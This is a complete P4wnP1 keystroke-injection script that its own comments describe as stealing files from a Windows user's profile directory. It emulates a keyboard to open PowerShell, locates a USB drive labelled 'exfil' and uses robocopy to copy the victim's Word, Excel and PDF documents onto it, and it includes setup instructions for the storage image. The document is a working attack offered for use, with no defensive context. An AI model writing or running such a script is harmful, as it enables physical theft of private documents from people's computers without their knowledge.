// Steal files from Windows machine %userprofile% directory
// You need to setup P4wnP1 USB Gadget Settings as HID keyboard and Mass storage
// Create storage using genimg: "/usr/local/P4wnP1/helper/genimg -i -s 500 -o 500mb -l exfil"

layout('us') //set layout us
press("GUI r") // windows + r
delay(500) 
type("powershell\n") // write powershell and press "enter"
delay(1000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'exfil' } | select name\n")
type("robocopy $Env:UserProfile $usbpath.name *.doc *.docx *.xls *.xlsx *.pdf /S /MT /Z\n")
type("exit\n")  //exit
